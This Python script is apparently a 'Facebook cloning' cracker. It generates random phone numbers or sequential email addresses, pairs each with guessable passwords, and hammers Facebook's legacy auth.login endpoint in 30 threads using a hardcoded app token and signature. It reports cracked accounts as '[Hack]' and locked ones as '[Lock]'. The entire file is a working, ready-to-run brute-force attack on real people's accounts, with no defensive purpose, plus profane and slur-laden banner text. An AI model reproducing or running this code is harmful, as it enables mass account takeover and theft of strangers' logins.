# -*- coding: utf-8 -*-
#Coded by DulLah (fb.me/dulahz)
 
import os,sys,time,datetime,random,socket,hashlib,re,threading,json,urllib,requests,mechanize,concurrent.futures
from random import randint
 
def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('  \033[1;92m[Hack] %s -> %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('  \033[1;91m[Lock] %s -> %s '%(str(user), str(pw)))
        break
  except: pass
 
def random_numbers():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  os.system('clear')
  os.system('toilet -f big FB-CLONING -F gay')
 
  time.sleep(3)
  
  
  print('\033[1;97mββπππππππππππππππ')
 
 
  time.sleep(3)
  print('\033[1;92mβββMust be 5 digits or may not be less and may not be more.')
  
  
  print("Example: 88019")
  kode=str(input('  Enter number: '))
  exit('  The number must be 5 digits, so it can not be reduced..') if len(kode) < 5 else ''
  exit('  The number must be 5 digits, so not more.') if len(kode) > 5 else ''
  os.system('clear')
  os.system('toilet -f big FB-CLONING -F gay')
  jml=int(input('''
  \033[1;93mEnter the number of numbers to make an example: 500
  Total: '''))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:]), str(e[7:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,8)]) for e in range(jml)]]
  os.system('clear')
  time.sleep(3)
  os.system('toilet -f big CLONING----  -F gay | lolcat')
  os.system('toilet -f big START  -F gay | lolcat')
  print('>>>>>>>Please wait.........>>>>')
  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Sudah selesai kak')
 
def random_email():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  os.system('clear')
  os.system('toilet -f big EMAIL -F gay | lolcat')
  os.system('toilet -f big CRACKER -F gay')                                              
  print('''
  1. Fill in the name of the user,
  
  Example: adnan 
  ''')
  time.sleep(3)
  nama=input('  User name: ')
  os.system('clear')
  os.system('toilet -f big EMAIL -F gay | lolcat')
  os.system('toilet -f big CRACKER -F gay')
  domain=input('''
  \033[1;93mSelect the domain [G]mail, [Y]ahoo, [H]otmail
  select (g,y,h): ''').lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit('  Please fill in the correct.') if not domain in ['g','y','h'] else ''
  os.system('clear')
  os.system('toilet -f big EMAIL -F gay | lolcat')
  os.system('toilet -f big CRACKER -F gay')
  jml=int(input('''
  \033[1;97mEnter the number of e-mails that will be created as an example: 500
  Total: '''))
  os.system('clear')
  os.system('toilet -f big EMAIL -F gay | lolcat')
  os.system('toilet -f big CRACKER -F gay')
  setpw=input('''
  Set a password that approaches the username
  example: adnan123, adnan1234, adnan000
  Set password: ''').split(',')
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  time.sleep(2)
  os.system('clear')
  os.system('toilet -f big CLONING--Start -F gay | lolcat')
  time.sleep(3)
  print('>>>>>>>Please wait.........>>>>')
  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  \033[1;93m2FUCK FUCK FUCK ZUCKERBERG')
 
def pilih():
  os.system('toilet -f big B D K R 28 -F gay | lolcat')
  print('''
 \ \033[1;91m1. Crack from a random number  |
 \ \___________________________________|
\  \033[1;93m2. crack from random emails   /				ππππππ
  \--------------------------------------------------------/
  *****\033[1;92mTelegram: http://t.me/bdkr2
  ------------------------------------------------------------------------------
  _______________________________________________
  ββ\033[1;92mYoutube: BDKR-28
  ''')
  pil=int(input('  Choose Number: '))
  if pil == 1:
    random_numbers()
  elif pil == 2:
    random_email()
  else:
    exit('  goodluck')
 
pilih() if __name__ == '__main__' else exit('Sorry, something wrong, please try again later.')
 
